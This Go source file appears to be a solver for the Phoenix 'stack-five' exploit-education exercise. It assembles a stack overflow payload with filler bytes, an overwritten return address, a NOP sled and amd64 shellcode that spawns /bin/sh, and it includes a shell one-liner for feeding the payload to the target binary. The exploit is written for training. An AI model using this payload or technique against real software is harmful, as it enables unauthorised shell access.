package main

type stack5 struct {
}

func (s stack5) get_lesson_name() string {
	return "stack-five"
}

func (s stack5) get_input_method() int {
	return inputPipe
}

func (s stack5) get_environment_key() string { return "" }

func (s stack5) get_input_data() []byte {
	initialBuffer := make([]byte, 128)
	fill_byte_array_ordered(initialBuffer)

	extraBufferUntilEIP := make([]byte, 8)
	fill_byte_array_ordered_ex(extraBufferUntilEIP, 'A', 1)

	/*
		Memory address found with gdb $rsp:
		0x00007fffffffe600
	*/
	EIP := []byte{
		'\xf0',
		'\xe6',
		'\xff',
		'\xff',
		'\xff',
		'\x7f',
		'\x00',
		'\x00',
	}

	/*
		We need a nop buffer because every time we run the exactly memory address
		is a bit different. This way we make sure we fall inside the nop range and
		continue until the actual code.
	*/
	nopBuffer := make([]byte, 90)
	fill_byte_array(nopBuffer, '\x90')

	shellCode := get_shellcode()

	password := append(initialBuffer[:], extraBufferUntilEIP[:]...)
	password = append(password, EIP[:]...)
	password = append(password, nopBuffer...)
	password = append(password, shellCode...)

	/*
		In this case it is easier to run the exploit by:
		`$ (cat /tmp/five ; cat) | /opt/phoenix/amd64/stack-five`
	*/
	dump_password_to_file(password, "/tmp/five")

	return password
}

func get_shellcode() []byte {
	shellcode := ""
	/* breakpoint to test if the code worked well. */
	// shellcode += "\xcc\xcc\xcc\xcc"

	// https://www.zorinaq.com/papers/shellcode-amd64.html
	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
	shellcode += "\x54\x5f\x52\x57\x54\x5e\x0f\x05"
	return []byte(shellcode)
}
